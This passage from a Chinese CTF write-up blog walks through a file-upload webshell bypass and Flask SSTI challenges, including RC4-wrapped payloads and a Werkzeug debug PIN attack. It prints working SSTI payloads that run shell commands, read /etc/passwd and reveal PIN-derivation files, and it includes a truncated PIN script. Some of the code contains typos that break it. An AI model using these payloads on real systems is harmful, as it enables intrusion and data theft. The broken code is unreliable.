<p>那就直接用GIF89a文件头绕一下试试看：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200715162359.png" alt="image-20200715162359334"></p> <p>直接显示上传成功了，，然后就看一下文件的位置，右键点击图片链接检查一下：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200715162811.png" alt="image-20200715162632689"></p> <p>找了的shell的位置，然后蚁剑连一下，flag在根目录下，直接读取即可</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200715162955.png" alt="image-20200715162939025"></p> <h2 id="ssti"><a href="#ssti" class="header-anchor">#</a> SSTI</h2> <h3 id="double-secret"><a href="#double-secret" class="header-anchor">#</a> Double Secret</h3> <p><strong>考点：</strong></p> <ul><li><strong>flask框架开启debug模式会暴露源码</strong></li> <li><strong>RC4加密算法</strong></li></ul> <p>这道题目一开始没给什么提示，让我们去Find Secret</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718201248.png" alt="image-20200718201241502"></p> <p>扫了后台没啥东西，然后看了wp才知道正确姿势是去访问/secret</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718201436.png" alt="image-20200718201436427"></p> <p>按照这个思路，那么&quot;Tell me your secret&quot;应该就是让我们传入参数secret</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718201529.png" alt="image-20200718201529213"></p> <p>传入参数有回显，存在ssti可能性，但是回显值和我们输入值不相同，传入2试试</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718201653.png" alt="image-20200718201653362"></p> <p>直接报错，并且开启了debug模式，借此我们可以看到一部分关键源码</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718203435.png" alt="image-20200718201750325"></p> <p>源码如下(关键地方已做注释)：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">if</span><span class="token punctuation">(</span>secret<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Tell me your secret.I will encrypt it so others can\'t see'</span>
    <span class="token comment">#使用RC4加密算法，密钥为&quot;HereIsTreasure&quot;</span>
    rc<span class="token operator">=</span>rc4_Modified<span class="token punctuation">.</span>RC4<span class="token punctuation">(</span><span class="token string">&quot;HereIsTreasure&quot;</span><span class="token punctuation">)</span>   <span class="token comment">#解密</span>
    <span class="token comment">#将我们传入的secret参数进行RC4加密</span>
    deS<span class="token operator">=</span>rc<span class="token punctuation">.</span>do_crypt<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
 	<span class="token comment">#进行模板渲染，并用safe函数过滤</span>
    a<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>safe<span class="token punctuation">(</span>deS<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
    <span class="token keyword">if</span> <span class="token string">'ciscn'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'flag detected!'</span>
    <span class="token keyword">return</span> a
Open an interactive python shell <span class="token keyword">in</span> this frame 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>确实存在ssti注入漏洞，但是服务端会对传入的参数进行RC4算法加密，这就是为什么回显和我们传参的值不相同，但是RC4是一种对称加密算法，也就是说，我们如果知道密钥，就可以进行解密。</p> <p>所以题目思路就是将payload进行一次RC4解密，我们传入解密后的数据再经过一次RC4加密之后就成了正常的payload。</p> <p>下面的RC4加密解密脚本来自于一位师傅的博客：<a href="https://0verwatch.top/RC4-python.html" target="_blank" rel="noopener noreferrer">这里<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>我做了一点点小小的改动，加了一个url编码功能，脚本如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#python3</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">import</span> base64
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse

<span class="token keyword">def</span> <span class="token function">get_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;输入你的信息：&quot;</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> s

<span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;输入你的秘钥：&quot;</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        key <span class="token operator">=</span> <span class="token string">'none_public_key'</span>
    <span class="token keyword">return</span> key

<span class="token keyword">def</span> <span class="token function">init_box</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    S盒
    &quot;&quot;&quot;</span>
    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#我这里没管秘钥小于256的情况，小于256应该不断重复填充即可</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token comment">#print(type(s_box)) #for_test</span>
    <span class="token keyword">return</span> s_box

<span class="token keyword">def</span> <span class="token function">ex_encrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span>box<span class="token punctuation">,</span>mode<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    利用PRGA生成秘钥流并与密文字节异或，加解密同一个算法
    &quot;&quot;&quot;</span>

    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            c_mode <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;输入你的解密模式:Base64 or ordinary\n&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> c_mode <span class="token operator">==</span> <span class="token string">'Base64'</span><span class="token punctuation">:</span>
                plain <span class="token operator">=</span> base6b64decode<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>
                plain <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            <span class="token keyword">elif</span> c_mode <span class="token operator">==</span> <span class="token string">'ordinary'</span><span class="token punctuation">:</span>
                plain <span class="token operator">=</span> plain
                <span class="token keyword">break</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Something Wrong,请重新新输入&quot;</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> j <span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">256</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">256</span>
        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span> <span class="token number">256</span>
        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">^</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>

    cipher <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
    <span class="token comment">#print(cipher)</span>
    <span class="token keyword">if</span>  mode <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
        <span class="token comment"># 化成可视字符需要编码</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;加密后的输出(没经过任何编码):&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
        <span class="token comment"># base64的目的也是为了变成可见字符</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base64后的编码:&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base6b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;解密后的密文：&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;url编码之后密文：&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;请选择加密或者解密&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;1. Encrypt&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;2. Decode&quot;</span><span class="token punctuation">)</span>
    mode <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
        message <span class="token operator">=</span> get_message<span class="token punctuation">(</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> get_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
        box <span class="token operator">=</span> init_box<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        ex_encrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span>box<span class="token punctuation">,</span>mode<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
        message <span class="token operator">=</span> get_message<span class="token punctuation">(</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> get_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
        box <span class="token operator">=</span> init_box<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        ex_encrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> box<span class="token punctuation">,</span> mode<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;输入有误！&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        get_mode<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br></div></div><p>将我们的payload进行RC4解密：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718202624.png" alt="image-20200718202624055"></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls /').read()&quot;)}}{% endif %}{% endfor %}

url编码之后密文：
.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%9C%1A%3A%3F%C3%A6%C2%B2%20%C2%A2%C3%82%C2%B9%0F%0B%C3%95G%23-%C3%A9%C2%A2%19%C3%85%C2%B2%C2%8F%22%C3%AE%C2%A3%C2%93l%C3%8A%7B%03%C3%B9%C2%B6%C2%92%C3%97%11%20%C3%9C%C3%AE%C3%AA%02
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>传参</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718203130.png" alt="image-20200718202826798"></p> <p>根目录下存在flag.txt，改一下payload继续解密一次即可</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718203111.png" alt="image-20200718203111636"></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('cat /flag.txt').read()&quot;)}}{% endif %}{% endfor %}

url编码之后密文：
.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23~%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>传参，拿到flag</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718203226.png" alt="image-20200718203226169"></p> <h3 id="i-flask"><a href="#i-flask" class="header-anchor">#</a> I_❤️_Flask</h3> <p><strong>考点：</strong></p> <ul><li><strong>flask模板注入</strong></li></ul> <p>题目存在一个隐藏参数name，知道这一点以后常规的flask框架的ssti的payload都能打。</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200722161324.png" alt="image-20200722161316956"></p> <h3 id="flaskapp"><a href="#flaskapp" class="header-anchor">#</a> FlaskApp</h3> <p><strong>考点：</strong></p> <ul><li><strong>Flask开启debug模式会导致PIN码攻击</strong></li></ul> <p>获取Flask的PIN码需要以下条件：</p> <ul><li>运行app的用户名，在/etc/passwd</li> <li>module name，一般为flask.app</li> <li><code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code>  --&gt;  结果为Flask</li> <li>app.py的绝对路径，debug模式下就可以直接看见</li> <li>MAC地址的十进制数，一般在<code>/sys/class/net/eth0/address</code></li> <li>机器的ID：对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_i</code>，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取<code>/proc/self/cgroup</code>，序列号为1那行</li></ul> <p><strong>解题</strong></p> <p>题目有base64加密和base64解密的功能，还有个hint：失败是成功之母，先测试是否有SSTI</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805175641.png" alt="image-20200805175641158"></p> <p>拿到解码模块去解码</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805173703.png" alt="image-20200805173656453"></p> <p>显然存在SSTI，结合给的hint，看看是否开启了debug模式，只需要随便输入不合符base64编码规范的字符串进行解码就可以了</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805173804.png" alt="image-20200805173804562"></p> <p>题目开启了debug模式，可以考虑使用PIN码攻击。下面就开始读取必要的信息</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">//</span>读取用户名
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805174005.png" alt="image-20200805174005270"></p> <p>依然用同样的方法读取剩下所必要的信息，由与过程大致相同，这里就略过了。最终利用脚本得到PIN码</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain

probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'flaskweb'</span>  <span class="token comment"># username</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>  <span class="token comment"># modname</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span>  <span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
    <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span>  <span class="token comment"># getattr(mod, '__file__', None),</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'2485410516817'</span><span class="token punctuation">,</span>  <span class="token comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span>
    <span class="token string">'6c729797fddf9cd2b01fb10d359bb020ffdc1b17621333bca5289136d2c88701'</span>  <span class="token comment"># get_machine_id(),/proc/self/cgroup</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
